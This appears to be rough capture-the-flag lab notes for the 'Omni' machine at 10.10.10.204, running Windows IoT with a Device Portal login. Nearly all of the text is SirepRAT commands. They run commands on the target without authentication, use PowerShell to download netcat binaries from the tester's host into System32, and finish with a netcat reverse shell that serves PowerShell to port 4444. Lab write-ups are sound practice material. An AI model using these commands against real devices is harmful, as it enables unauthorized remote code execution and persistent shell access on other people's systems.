# Omni - Unknown - 10.10.10.204

# Enumeration:

nmap scan

# Further Enumeration:

Going to the site gives a login panel, which asks for a username and password with the following prompt:

```
http://10.10.10.204:8080 is requesting your username and password. The site says: "Windows Device Portal"
```

This 'Windows Device Portal' seems interesting.


python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "c:\windows\system32\cmd.exe" --args "/c curl.exe" --v

python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "c:\windows\system32\cmd.exe" --args "/c powershell Invoke-Webrequest -Outfile /tools/nc/nc.exe -Uri http://10.10.15.255:80/nc.exe" --v


python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "c:\windows\system32\cmd.exe" --args "/c powershell Invoke-Webrequest -Outfile c:\windows\system32\nc.exe -Uri http://10.10.15.255:80/nc.exe" --v

python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "c:\windows\system32\cmd.exe" --args "/c powershell Invoke-Webrequest -Outfile c:\windows\system32\nc64.exe -Uri http://10.10.15.255:80/nc64.exe" --v



python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "c:\windows\system32\cmd.exe" --args "/c powershell Invoke-Webrequest -Uri http://10.10.15.255:80 -OutFile c:\windows\system32\nc64.exe"

python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd “C:\Windows\System32\cmd.exe” --args "/c powershell Invoke-Webrequest -OutFile C:\Windows\System32\nc64.exe -Uri http://10.10.15.255:80/nc64.exe" --v


python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd “C:\Windows\System32\cmd.exe” --args "/c C:\\Windows\\System32\\nc64.exe 10.10.15.255 4444 -e powershell.exe" --v